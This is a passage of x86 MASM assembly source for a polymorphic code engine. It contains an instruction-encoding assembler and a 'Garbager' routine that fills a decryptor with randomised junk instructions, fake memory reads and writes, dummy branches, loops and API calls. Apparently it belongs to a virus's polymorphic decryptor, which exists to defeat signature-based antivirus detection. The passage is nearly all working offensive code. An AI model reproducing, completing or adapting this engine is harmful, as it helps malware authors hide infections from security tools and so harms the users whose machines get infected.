        Or Flags,RM_REG
    .EndIf
    .If (Flags & BITS8)
        .If (Opcode <2)
            Mov Eax,0FEH
            Stosb
            Invoke ModRM, Byte Ptr [Opcode],RM,Flags,Disp
        .Else
            Mov Eax,0F6H
            Stosb
            Invoke ModRM, Byte Ptr [Opcode],RM,Flags,Disp
        .EndIf
    .Else
        .If (Opcode<2)
            .If (Flags & RM_REG)
                Mov Eax,08H
                Mov Edx,Opcode
                Mul Edx
                Add Eax,40H
                Add Al,RM
                Stosb
            .Else
                Mov Eax,0FFH
                Stosb
                Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
            .EndIf
        .Else
            Mov Eax,0F7H
            Stosb
            Invoke ModRM, Byte Ptr [Opcode],RM,Flags,Disp
        .EndIf
    .EndIf
    Ret
ASMState2 EndP
ASMState3 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If (Flags & R_IMM)
        Mov Al,Reg
        Mov RM,Al
        Or Flags,RM_REG
    .EndIf
    .If (Flags & BITS8)
        Mov Ecx,0
    .ElseIf (Flags & BITS16)
        Mov Al,66H
        Stosb
        Mov Ecx,1
    .Else
        Mov Ecx,1
    .EndIf
    .If (Flags & R_IMM) || (Flags & RM_IMM)
        .If Imm ==1
            Mov Eax,0D0H
            Add Eax,Ecx
            Stosb
            Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
        .Else
            Mov Eax,0C0H
            Add Eax,Ecx
            Stosb
            Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
            .If Imm>32
                Mov Eax,31
            .Else
                Mov Eax,Imm
            .EndIf
            Stosb
        .EndIf
    .Else
        Mov Eax,0D2H
        Add Eax,Ecx
        Stosb
        Invoke ModRM, Byte Ptr[Opcode],RM,Flags,Disp
    .EndIf
    Ret
ASMState3 EndP
ASMState4 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If !(Imm & 0FFFFFF00H); || (Imm    > 0FFFFFF80H)   ;rel 8
        Mov Eax,72H
        Add Eax ,Opcode
        Stosb
        Mov Eax,Imm
        Stosb
    .Else
        Mov Eax,0FH
        Stosb
        Mov Eax,82H     ;0F (escape opcode) 82 (for jcc)
        Add Eax,Opcode
        Stosb
        Mov Eax,Imm
        Stosd
    .EndIf
    Ret
ASMState4 EndP
ASMState5 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If (Opcode==1) &&(Flags & REL_ADDR) && !(Imm & 0FFFFFF00H)
        Mov Eax,0EBH
        Stosb
        Mov Eax,Imm
        Stosb
    .ElseIf (Flags & REL_ADDR)
        Mov Eax,0E8H
        Add Eax,Opcode
        Stosb
        Mov Eax,Imm
        Stosd
    .Else ;(Flags & RM_ADDR)
        Mov Eax,0FFH
        Stosb
        .If (Opcode==1)
            Mov Reg,4
        .Else
            Mov Reg,2
        .EndIf
        Invoke ModRM, Reg,RM,Flags,Disp
    .EndIf
    Ret
ASMState5 EndP
ASMState6 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If (Flags & ONLY_RM)&& (Flags & RM_REG)
        Mov Al,RM
        Mov Reg,Al
        Mov Eax,ONLY_RM
        Not Eax
        And Flags,Eax
        Or Flags,ONLY_REG
    .EndIf
    .If (Flags & ONLY_REG)
        Mov Eax,Opcode
        Mov Edx,8
        Mul Edx
        Add Al,Reg
        Add Eax,50H
        Stosb
    .ElseIf(Flags & ONLY_RM)
        .If Opcode==0
            Mov Eax,0FFH
            Stosb
            Invoke ModRM, 6,RM,Flags,Disp
        .Else
            Mov Eax,8FH
            Stosb
            Invoke ModRM, 0,RM,Flags,Disp
        .EndIf
    .Else
        .If (Opcode==0)
            .If(Imm & 0FFFFFF00H)
                Mov Eax,68H
                Stosb
                Mov Eax,Imm
                Stosd
            .Else
                Mov Eax,6AH
                Stosb
                Mov Eax,Imm
                Stosb
            .EndIf
        .EndIf
    .EndIf
    Ret
ASMState6 EndP
ASMState7 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    Mov Eax,60H
    Add Eax,Opcode
    Stosb
    Ret
ASMState7 EndP
ASMState8 Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If Opcode==4
        Mov Eax,66H
        Stosb
        Mov Opcode,1
    .ElseIf Opcode==5
        Mov Eax,66H
        Stosb
        Mov Opcode,3
    .EndIf
    Mov Eax,0AAH
    Add Eax,Opcode
    Stosb
    Ret
ASMState8 EndP
ASMMov Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    Local Flag1:DWord
    Local Flag2:DWord

    .If (Flags & R_RM)
        Mov Flag1,2
    .Else
        Mov Flag1,0
    .EndIf
    .If (Flags & BITS8)
        Mov Flag2,0
    .ElseIf (Flags & BITS16)
        Mov Eax,66H
        Stosb
        Mov Flag2,1
    .Else
        Mov Flag2,1
    .EndIf
    .If (Flags & RM_R) ||(Flags & R_RM)
        .If (Reg==REG_EAX) && (Flags & RM_NOREG)
            Mov Eax,0A2H
            Sub Eax,Flag1
            Add Eax,Flag2
            Stosb
            Mov Eax,Disp
            Stosd
        .Else
            Mov Eax,88H
            Add Eax,Flag1
            Add Eax,Flag2
            Stosb
            Invoke ModRM, Reg,RM,Flags,Disp
        .EndIf
    .Else
        .If (Flags & RM_IMM) && (Flags & RM_REG)
            Mov Al,RM
            Mov Reg,Al
            Or Flags,R_IMM
            Xor Flags,RM_IMM
        .EndIf
        .If (Flags & R_IMM)
            Mov Eax,Flag2
            Mov Edx,8
            Mul Edx
            Add Eax,0B0H
            Add Al,Reg
            Stosb
            Mov Eax,Imm
            .If (Flags & BITS8)
                Stosb
            .ElseIf (Flags & BITS16)
                Stosw
            .Else
                Stosd
            .EndIf
        .Else
            .If (Flags & BITS8)
                Mov Eax,0C6H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Eax,Imm
                Stosb
            .ElseIf (Flags & BITS16)
                Mov Eax,0C7H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Eax,Imm
                Stosw
            .Else
                Mov Eax,0C7H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Eax,Imm
                Stosd
            .EndIf
        .EndIf
    .EndIf
    Ret
ASMMov EndP
ASMTest Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
        .If (Reg==REG_AL) && (Flags & (BITS8) && (Flags & R_IMM))
            Mov Eax,0A8H
            Stosb
            Mov Al,Byte Ptr [Imm]
            Stosb                   ;here we will write 1 byte only
        .ElseIf (Reg==REG_EAX) && (Flags & (R_IMM))
            .If (Flags & BITS16)
                Mov Eax,66H
                Stosb
                Mov Eax,0A9H
                Stosb
                Mov Ax,Word Ptr[Imm]
                Stosw
            .Else
                Mov Eax,0A9H
                Stosb
                Mov Eax,Imm
                Stosd
            .EndIf
        .ElseIf (RM==REG_EAX) && (Flags &RM_IMM) && (Flags & RM_REG)&& (Flags & BITS8)
            Mov Eax,0A8H
            Stosb
            Mov Al,Byte Ptr [Imm]
            Stosb                   ;here we will write 1 byte only
        .ElseIf (RM==REG_EAX) && (Flags &RM_IMM) && (Flags & RM_REG)
            .If (Flags & BITS16)
                Mov Eax,66H
                Stosb
                Mov Eax,0A9H
                Stosb
                Mov Ax,Word Ptr[Imm]
                Stosw
            .Else
                Mov Eax,0A9H
                Stosb
                Mov Eax,Imm
                Stosd
            .EndIf
        .ElseIf(Flags & (RM_IMM) || (Flags & R_IMM))
            .If (Flags & R_IMM)
                Mov Al,Reg
                Mov RM,Al
                Or Flags,RM_REG
            .EndIf
            .If (Flags & BITS8)
                Mov Eax,0F6H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Al,Byte Ptr[Imm]
                Stosb
            .ElseIf (Flags & BITS16)
                Mov Eax,66H
                Stosb
                Mov Eax,0F7H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Ax,Word Ptr [Imm]
                Stosw
            .Else
                Mov Eax,0F7H
                Stosb
                Invoke ModRM, 0,RM,Flags,Disp
                Mov Eax ,Imm
                Stosd
            .EndIf
        .ElseIf (Flags & RM_R) || (Flags &R_RM)
            .If (Flags & BITS8)
                Mov Eax,84H
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .ElseIf (Flags & BITS16)
                Mov Eax,066H
                Stosb
                Mov Eax,85H
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .Else
                Mov Eax,85H
                Stosb
                Invoke ModRM, Reg,RM,Flags,Disp
            .EndIf
        .EndIf
    Ret
ASMTest EndP
ASMMisc Proc Opcode:DWord, Pointer:DWord, Reg:Byte, RM:Byte, Flags:DWord, Disp:DWord, Imm:DWord
    .If (Opcode==0)
        Mov Eax,0C9H
        Stosb
    .ElseIf (Opcode==1)
        Mov Eax,0C3H
        Stosb
    .ElseIf (Opcode==2)
        .If (Flags & BITS16)
            Mov Eax,66H
            Stosb
        .EndIf
        Mov Eax,8DH
        Stosb
        Invoke ModRM, Reg,RM,Flags,Disp
    .ElseIf (Opcode==3)
        Mov Eax,0FH
        Stosb
        Mov Eax,0C8H
        .If (Flags & ONLY_RM)
            Add Al,RM
        .Else
            Add Al,Reg
        .EndIf
        Stosb
    .ElseIf (Opcode==4)
        .If Flags & BITS16
            Mov Eax,66H
            Stosb
        .EndIf
        .If((Reg==REG_EAX) ||(RM==REG_EAX)) && (Flags & RM_REG) && !(Flags & BITS8)

            Mov Eax,90H
            .If Reg==REG_EAX
                Add Al,RM
            .Else
                Add Al,Reg
            .EndIf
            Stosb
        .Else
            .If (Flags & BITS8)
                Mov Eax,86H
                Stosb
            .Else
                Mov Eax,87H
                Stosb
            .EndIf
            Invoke ModRM, Reg,RM,Flags,Disp
        .EndIf
    .ElseIf (Opcode==5)
        Mov Eax,90H
        Stosb
    .EndIf
    Ret
ASMMisc EndP
;------------------------------------------------------------------------------------------
;Keyword:GarPJ_Place
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
     ;-=-=-=                            The Garbager                              =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=    Return:                                                           =-=-=-
     ;-=-=-=        eax-->Pointer to the end of the created Garbage               =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=                                                                      =-=-=-
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
GarPJ Proc Uses Ecx Ebx Edx Esi Edi NumOfIns:DWord,DecryptorEip:DWord,HeapPtr:DWord,Flags:DWord
    Local UsedRegs:DWord
    Local dEip  :DWord
    Local RemainIns:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Mov Edi,HeapPtr
    Movzx Eax,[Edi].RWPolyData.AffectedRegs
    Mov UsedRegs,Eax
    Mov Ecx,NumOfIns
    Mov RemainIns,Ecx
    Mov Edi,DecryptorEip
    Mov dEip,Edi
    .While RemainIns>0
        Invoke Rand,150 ;not 100h as we need really 100 for 100%
        ;we will not use 16 & 8 bits instructions because they are rarely used
        ;only in cmp we will use them and so rare


        ;=*-=*-=*-=*-=*-= MATH&MOV INSTRUCTIONS =*-=*-=*-=*-=*-=;

        .If Eax <50     ;mean 50% for this instructions
            Invoke Rand, 2  ;mean read or write
            ;Mov Eax,1
            .If Eax==0      ;**READ**
                Call State1_NextIns
                DB 0,40H,1,40H,40H,4,5,6,40H,44H,40H    ;40h mean mov I add many mav because it used many
State1_NextIns:
                Pop Esi
                ;pointer to the instructions
                Invoke Rand,10
                Add Esi,Eax         ;the instruction we need
                Invoke GetValidReg,UsedRegs
                Push Eax            ;save the register we take
                Invoke Rand,3       ;mean read form local variable,read from global variable or read from register
                .If Eax==0      ;**READ FROM GLOBAL VARIABLE**
                    Push Edi
                    Mov Edi,HeapPtr
                    Mov Edx,[Edi].RWPolyData.DataSectionRVA
                    Invoke Rand,[Edi].RWPolyData.DataSectionSize
                    Add Edx,Eax         ;the global variable (we choose) RVA
                    Pop Edi
                    Pop Eax
                    Mov Bl,Al
                    ;Let's Do it
                    Movzx Esi,Byte Ptr [Esi]
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi, Bl,0,R_RM Or RM_NOREG,Edx,0
                    Mov dEip,Edi
                .ElseIf Eax==1 ;**READ FROM LOCAL VARIABLE**
                    Push Edi
                    Mov Edi,HeapPtr
                    Invoke GetLocalVar, HeapPtr
                    Mov Edx,Eax
                    Pop Edi                                 ;return decryptPtr
                    Pop Eax                                 ;return the register we choose
                    Movzx Esi,Byte Ptr [Esi]
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi,Al,REG_EBP,R_RM,Edx,0
                    Mov dEip,Edi
                .Else   ;**READ FROM A REGISTER**
                    Invoke GetValidReg,UsedRegs
                    Mov Edx,Eax
                    Pop Eax
                    Mov Bl,Al
                    Movzx Esi,Byte Ptr [Esi]
                    .If Esi==44H        ;mean lea and no lea reg,reg
                        Mov Esi,40H     ;make it mov
                    .EndIf
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi,Bl,Dl,R_RM Or RM_REG,0,0
                    Mov dEip,Edi
                .EndIf
            .Else           ;**WRITE**
                Call State2_NextIns
                DB 0,40H,1,40H,40H,4,5,6,40H,0,40H  ;40h mean mov I add many mav because it used many
State2_NextIns:
                Pop Esi
                Invoke Rand,10
                Add Esi,Eax
                Movzx Esi,Byte Ptr [Esi]    ;the instruction we need
                Invoke Rand,4
                ;Mov Eax,1
                .If Eax==0                  ;**LOCAL VARIABLE + REGISTER**
                    Invoke GetAnyReg        ;any register because we will not tigger it
                    Mov Temp1,Eax           ;save it
                    Invoke GetLocalVar, HeapPtr
                    Mov Edi,dEip            ;retrurn decryptor Eip
                    Mov Temp2,Eax           ;local variable ... save it
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi,Byte Ptr[Temp1],REG_EBP,RM_R,Temp2,0
                    Mov dEip,Edi            ;save now
                .ElseIf Eax==1              ;**LOCAL VARIABLE + IMM**
                    Invoke Rand, 0
                    Mov Temp1,Eax
                    Invoke Rand,8
                    Invoke GetLocalVar, HeapPtr
                    Mov Temp2,Eax           ;local variable ... save it
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi,0,REG_EBP,RM_IMM,Temp2,Temp1
                    Mov dEip,Edi
                .ElseIf Eax==2          ;**REGISTER + IMM**
                    Invoke GetValidReg, UsedRegs
                    Mov Temp1,Eax           ;save it
                    Invoke Rand, 0
                    Mov Temp2,Eax
                    Mov Edi,dEip
                    Invoke Assembl, Esi,Edi,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                    Mov dEip,Edi
                .Else
                    Call State3_NextIns
                    DB 8,9,0AH,0BH
State3_NextIns:
                    Pop Esi
                    Invoke Rand,4
                    Add Esi,Eax
                    Movzx Esi,Byte Ptr [Esi]    ;the instruction we need
                    Invoke Rand, 2              ;register or local variable
                    .If Eax==0                  ;Local Variable
                        Invoke GetLocalVar,HeapPtr
                        Mov Temp2,Eax
                        Mov Edi,dEip
                        Invoke Assembl, Esi,Edi,0,REG_EBP,RM_IMM,Temp2,0
                        Mov dEip,Edi
                    .Else                       ;Register
                        Invoke GetValidReg, UsedRegs
                        Mov Temp1,Eax           ;save it
                        Mov Edi,dEip
                        Invoke Assembl, Esi,Edi,Byte Ptr [Temp1],0,R_IMM,0,0
                        Mov dEip,Edi
                    .EndIf
                .EndIf
            .EndIf
            Dec Ecx
            Dec RemainIns
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= PUSH&POP INSTRUCTIONS =*-=*-=*-=*-=*-=;

        .ElseIf Eax<60
            Mov Edx,Flags
            .If (RemainIns>=3)  && !(Dl & NO_REGRESERVE)
                Sub RemainIns,2             ;2 instructions for push and pop
                .If RemainIns>10
                    Invoke Rand, 10         ;maximum 10 garbag inside
                .Else
                    Invoke Rand,RemainIns   ;we have less than 10 so get a number between
                .EndIf
                Add Eax,1
                Mov Temp1,Eax
                Sub RemainIns,Eax
                Invoke Rand,2               ;PUSH/POP a specific register (change in UsedRegs)or PUSH/POP random register or local variable
                ;Mov Eax,0
                .If Eax==0                  ;**PUSH/POP A SPECIFIC REGISTER**
                    Mov Edi,HeapPtr         ; we will use it
                    Invoke GetAnyReg        ;gettig the register
                    Mov Temp2,Eax           ;save it in Temp2
                    Mov Edx,1
                    Mov Ecx,Eax
                    Shl Edx,Cl              ;make the register like 00000100B -->if edx
                    Not Edx                 ;make it like 11111011B For use it In And
                    And [Edi].RWPolyData.AffectedRegs,Dl
                    Mov Edi,dEip
                    Invoke Assembl, ASM_PUSH,Edi,Byte Ptr [Temp2], 0,ONLY_REG,0,0
                    Mov dEip,Edi
                    Mov Edx,Flags
                    Or Dl,NO_REGSWAPPING
                    ;Or Dl,NO_REGRESERVE
                    Invoke GarPJ,Temp1,Edi,HeapPtr,Edx
                    Mov dEip,Eax
                    Invoke Assembl, ASM_POP,dEip,Byte Ptr [Temp2],0,ONLY_REG,0,0
                    Mov dEip,Edi
                    Mov Edi,HeapPtr
                    Mov Eax,UsedRegs
                    Mov [Edi].RWPolyData.AffectedRegs,Al
                    Mov Edi,dEip
                .Else                       ;**PUSH/POP A REGISTER OR LOCAL VARIABLE**
                    Invoke Rand,2           ;register or local variable?
                    .If Eax==0              ;REGISTER
                        Invoke GetValidReg,UsedRegs
                        Mov Temp2,Eax       ;save it
                        Mov Edi,dEip
                        Invoke Assembl, ASM_PUSH,Edi,Byte Ptr [Temp2],0,ONLY_REG,0,0
                        Mov dEip,Edi
                    .Else                   ;LOCAL VARIABLE
                        Invoke GetLocalVar, HeapPtr
                        Mov Temp2,Eax
                        Mov Edi,dEip
                        Invoke Assembl, ASM_PUSH,Edi,0,REG_EBP,ONLY_RM,Temp2,0
                        Mov dEip,Edi
                    .EndIf
                    Mov Edx,Flags
                    ;Or Dl,NO_REGSWAPPING
                    Invoke GarPJ, Temp1,dEip,HeapPtr,Edx
                    Mov dEip,Eax
                    Mov Edi,HeapPtr
                    Movzx Eax,[Edi].RWPolyData.AffectedRegs
                    Mov UsedRegs,Eax    ;save it again (maybe changed by regsterswapping)
                    ;now Let's make the Pop
                    Invoke Rand,2           ;register or local variable?
                    .If Eax==0              ;REGISTER
                        Invoke GetValidReg,UsedRegs
                        Mov Temp2,Eax       ;save it
                        Mov Edi,dEip
                        Invoke Assembl, ASM_POP,Edi,Byte Ptr [Temp2],0,ONLY_REG,0,0
                        Mov dEip,Edi
                    .Else                   ;LOCAL VARIABLE
                        Invoke GetLocalVar, HeapPtr
                        Mov Temp2,Eax
                        Mov Edi,dEip
                        Invoke Assembl, ASM_POP,Edi,0,REG_EBP,ONLY_RM,Temp2,0
                        Mov dEip,Edi
                    .EndIf
                .EndIf
            .EndIf
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= IF-ELSE INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<70
            .If (RemainIns >= 3)
                Mov Eax,RemainIns
                Dec Eax                 ;at least one for garbage
                Shr Eax,1               ;eax/2-->expression take 2 instruction each
                .If Eax>3
                    Invoke DoExpression, dEip,HeapPtr,3
                .Else
                    Invoke DoExpression, dEip,HeapPtr,Eax
                .EndIf
                Mov Temp1,Eax           ;num of fixing jmps
                Mov dEip,Edi
                Shl Eax,1               ;number of Instruction Used
                Sub RemainIns,Eax       ;subtract them
                .If RemainIns>10
                    Invoke Rand,10      ;Maximum 10 Instruction Inside
                .Else
                    Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                .EndIf
                Add Eax,1
                Mov Temp2,Eax
                Sub RemainIns,Eax
                Mov Edi,HeapPtr
                Inc [Edi].RWPolyData.IFOrder
                Mov Edx,Flags
                Or Dl,NO_REGSWAPPING
                Invoke GarPJ, Temp2,dEip,HeapPtr,Edx    ;Do It
                Mov dEip,Eax
                Dec [Edi].RWPolyData.IFOrder
                Mov Temp2,0
                Invoke Rand,2                       ;Use Else or not ?
                .If Eax==0
                    .If RemainIns>=2            ;Yes Else
                        Invoke Assembl, ASM_JMP,dEip,0,0,REL_ADDR,0,0
                        Mov Temp2,Edi
                        Mov dEip,Edi
                        Dec RemainIns
                    .EndIf
                .EndIf
                Mov Ecx,Temp1
                Mov Esi,HeapPtr
                Movzx Edx,[Esi].RWPolyData.IFOrder
                Shl Edx,4
                Lea Esi,[Esi].RWPolyData.Temp
                Add Esi,Edx
                .While Ecx>0            ;fixing jmps
                    Mov Edi,DWord Ptr [Esi]
                    Mov Eax,Edi         ;eax-->the offset / edi-->pointer to the jmp
                    Add Eax,2           ;after the jmp (we assume the garbage will be <127 byte)
                    Sub Eax,dEip        ;getting the offset
                    Neg Al              ;from the distination(after the Garbage) to the source (jmp)
                    Mov Byte Ptr [Edi+1],Al
                    Add Esi,4
                    Dec Ecx
                .EndW
                .If !(Temp2==0)
                    .If RemainIns>10
                        Invoke Rand,10      ;Maximum 10 Instruction Inside
                    .Else
                        Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                    .EndIf
                    Inc Eax
                    Sub RemainIns,Eax
                    Mov Temp1,Eax
                    Mov Edx,Flags
                    Or Dl,NO_REGSWAPPING
                    Invoke GarPJ,Temp1,dEip,HeapPtr,Edx
                    Mov dEip,Eax
                    Mov Esi,Temp2               ;now fix the else jmp
                    Mov Eax,Temp2
                    Sub Eax,dEip
                    Neg Al
                    Mov Byte Ptr[Esi-1],Al
                .EndIf
                Mov Edi,dEip
            .EndIf
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= WHILE-LOOP INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<80
            ;no two loops inside each other(avoid become all registers reserved .. 4 by Algorithm +2 with while-loop ==ALL)
            Mov Edx,Flags
            .If (RemainIns>=6) && !(Dl & NO_REGRESERVE)
                Sub RemainIns,5
                Invoke GetValidReg, UsedRegs
                Mov Temp1,Eax
                Mov Edi,dEip
                ;set the variable to zero
                Invoke Assembl, ASM_XOR,Edi,Byte Ptr[Temp1],Byte Ptr[Temp1],R_RM Or RM_REG,0,0
                ;putting the jmp to the end
                Invoke Assembl, ASM_JMP,Edi,0,0,REL_ADDR,0,0
                Mov dEip,Edi
                Mov Temp2,Edi       ;save it
                .If RemainIns>10
                    Invoke Rand,10      ;Maximum 10 Instruction Inside
                .Else
                    Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                .EndIf
                Inc Eax             ;at least 1 not 0
                Mov Edx,Eax         ;save it
                Sub RemainIns,Edx
                Mov Edi,HeapPtr
                Mov Ecx,Temp1
                Mov Eax,1
                Shl Eax,Cl
                ; reserve this register
                Or [Edi].RWPolyData.AffectedRegs,Al
                Mov Ebx,Flags
                Or Bl,NO_REGSWAPPING
                Or Bl,NO_REGRESERVE
                Invoke GarPJ,Edx,dEip,HeapPtr,Ebx
                Mov dEip,Eax
                Mov Edi,HeapPtr
                Mov Eax,UsedRegs
                Mov [Edi].RWPolyData.AffectedRegs,Al ;release the register
                ;increment it
                Invoke Assembl, ASM_INC,dEip,Byte Ptr [Temp1],0,R_IMM,0,0
                Mov dEip,Edi
                ; this is the place where the jmp will pointed to
                Push Ebx
                Mov Ebx,Edi         ;let's save it
                Invoke Rand, 100    ;maximum 100 for a loop
                Mov Edx,Eax
                Invoke Assembl, ASM_CMP,dEip,Byte Ptr [Temp1],0,R_IMM,0,Edx
                Mov dEip,Edi
                Call WhileIns       ;we will use jnz,jb and jbe
                DB 18H,1BH,1CH
WhileIns:
                Pop Esi
                Invoke Rand,3
                Add Esi,Eax
                Movzx Esi,Byte Ptr [Esi]
                Invoke Assembl, Esi,dEip,0,0,REL_ADDR,0,0
                Mov dEip,Edi
                Mov Edx,Edi         ;now we will fix the jmps
                Mov Esi,Edi
                Sub Edx,Temp2       ;the offset between them
                Neg Edx
                Mov Byte Ptr [Esi-1],Dl
                Mov Edx,Ebx
                Sub Edx,Temp2
                Mov Esi,Temp2
                Mov Byte Ptr [Esi-1],Dl
                Pop Ebx
            .EndIf
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= CALL API INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<90
            Invoke CallAPI, dEip, RemainIns,HeapPtr,0
            .If !(Eax==0)
                Mov RemainIns,Eax
                Mov dEip,Edi
            .EndIf
;-----------------------------------------------------------------------------------------------
  ;=*-=*-=*-=*-=*-= READ WRITE SIMULATOR INSTRUCTIONS =*-=*-=*-=*-=*-=;
        .ElseIf Eax<100
            Mov Edx,Flags
            .If (RemainIns>3) && !(Dl & NO_REGRESERVE)
                Sub RemainIns,2
                Invoke Rand, 3
                .If Eax==0      ;**READ LIKE MOV EAX,DWORD[ECX+0040XXXX]**
                    ;here we will make mov ecx,0F + garbage + mov eax,dword ptr [ecx+0040XXXX]
                    ;we make it to become similar to the garbage instructions
                    Invoke GetValidReg, UsedRegs
                    Mov Temp1,Eax
                    Mov Ecx,Eax
                    Mov Edx,1
                    Shl Edx,Cl
                    Mov Edi,HeapPtr
                    Or [Edi].RWPolyData.AffectedRegs,Dl
                    Mov Eax ,[Edi].RWPolyData.DataSectionSize
                    Shr Eax,1       ;eax/2
                    Invoke Rand, Eax
                    Mov Temp2,Eax
                    ;Mov r32,imm8       small imm maximum the half of data section size
                    Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                    Mov dEip,Edi
                    .If RemainIns>10
                        Invoke Rand,10      ;Maximum 10 Instruction Inside
                    .Else
                        Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                    .EndIf
                    Sub RemainIns,Eax
                    Mov Temp2,Eax
                    Mov Ebx,Flags
                    Or Bl,NO_REGSWAPPING
                    Or Bl,NO_REGRESERVE
                    Invoke GarPJ, Temp2,dEip,HeapPtr,Ebx
                    Mov dEip,Eax
                    Mov Edi,HeapPtr
                    Mov Edx,UsedRegs
                    Mov [Edi].RWPolyData.AffectedRegs,Dl
                    Mov Eax ,[Edi].RWPolyData.DataSectionSize
                    Shr Eax,1       ;eax/2
                    Invoke Rand, Eax
                    Add Eax,[Edi].RWPolyData.DataSectionRVA
                    Mov Temp2,Eax
                    Invoke GetValidReg, UsedRegs
                    Mov Edx,Eax                 ;there's no temp avariable so use edx
                    Invoke Assembl, ASM_MOV,dEip, Dl,Byte Ptr [Temp1],R_RM,Temp2,0
                    Mov dEip,Edi
                .ElseIf Eax==1      ;** READ LIKE MOV EDI,0040XXXX + MOV EAX,DWORD PTR [EDI] **
                    Invoke GetValidReg, UsedRegs
                    Mov Temp1,Eax
                    Mov Ecx,Eax
                    Mov Edx,1
                    Shl Edx,Cl
                    Mov Edi,HeapPtr
                    Or [Edi].RWPolyData.AffectedRegs,Dl
                    Mov Edi,HeapPtr
                    Mov Eax ,[Edi].RWPolyData.DataSectionSize
                    Invoke Rand, Eax
                    Add Eax,[Edi].RWPolyData.DataSectionRVA
                    Mov Temp2,Eax
                    Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                    Mov dEip,Edi
                    .If RemainIns>10
                        Invoke Rand,10      ;Maximum 10 Instruction Inside
                    .Else
                        Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                    .EndIf
                    Sub RemainIns,Eax
                    Mov Temp2,Eax
                    Mov Ebx,Flags
                    Or Bl,NO_REGSWAPPING
                    Or Bl,NO_REGRESERVE
                    Invoke GarPJ, Temp2,dEip,HeapPtr,Ebx
                    Mov dEip,Eax
                    Mov Edi,HeapPtr
                    Mov Edx,UsedRegs
                    Mov [Edi].RWPolyData.AffectedRegs,Dl
                    Invoke GetValidReg, UsedRegs
                    Mov Temp2,Eax
                    Invoke Assembl, ASM_MOV,dEip, Byte Ptr [Temp2],Byte Ptr [Temp1],R_RM,0,0
                    Mov dEip,Edi
                .ElseIf Eax==2  ;**WRITE LIKE LEA EDI,[EBP-XX] + MOV [EDI],EAX
                    Invoke GetValidReg, UsedRegs
                    Mov Temp1,Eax
                    Mov Ecx,Eax
                    Mov Edx,1
                    Shl Edx,Cl
                    Mov Edi,HeapPtr
                    Or [Edi].RWPolyData.AffectedRegs,Dl

                    Invoke GetLocalVar, HeapPtr
                    Mov Temp2,Eax
                    Invoke Assembl, ASM_LEA,dEip,Byte Ptr [Temp1],REG_EBP,R_RM,Temp2,0
                    Mov dEip,Edi
                    .If RemainIns>10
                        Invoke Rand,10      ;Maximum 10 Instruction Inside
                    .Else
                        Invoke Rand, RemainIns  ;if Less make RemainIns the Maximum
                    .EndIf
                    Sub RemainIns,Eax
                    Mov Temp2,Eax
                    Mov Ebx,Flags
                    Or Bl,NO_REGSWAPPING
                    Or Bl,NO_REGRESERVE
                    Invoke GarPJ, Temp2,dEip,HeapPtr,Ebx
                    Mov dEip,Eax
                    Mov Edi,HeapPtr
                    Mov Edx,UsedRegs
                    Mov [Edi].RWPolyData.AffectedRegs,Dl
                    Invoke GetAnyReg
                    Mov Temp2,Eax
                    Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp2],Byte Ptr [Temp1],RM_R,0,0
                    Mov dEip,Edi
                .EndIf
            .EndIf
